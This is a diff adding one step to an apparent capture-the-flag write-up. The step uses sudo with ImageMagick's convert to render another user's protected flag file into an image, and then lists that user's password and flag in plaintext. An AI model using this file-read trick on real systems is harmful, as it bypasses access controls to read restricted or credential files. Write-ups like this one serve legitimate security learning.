@@ -1352,12 +1352,35 @@ I keep testing these passowrds until I found the right one.
     ## ES ##
     A la usuaria rhea le gustan las imagenes.
 
+![image](./assets/level48_sudo.jpg)
+
+`convert` is a command line utility that's used to convert between image formats as well as resize an image. I try to read the content of `/pwned/rhea/flagz.txt` by adding it to an image using convert
+
+this command do the job : 
+
+```bash
+sudo -u rhea convert -background white -fill black -size 400x100  label:@"/pwned/rhea/flagz.txt" /tmp/output.png
+```
+This command create an image named output.png with a white background and then put the content of flagz.txt in front of it.
+
+![image](./assets/output.png)
+
+
+| user | password | flag
+|------|----------|-----
+|rhea|iKVVfwEDFbBpTnlnKZKr|^WjwTEPwuQiQihkrexbg^
+
+# Mission 49
+
+
+
 
 
 
 
     
     
+
 
 
 
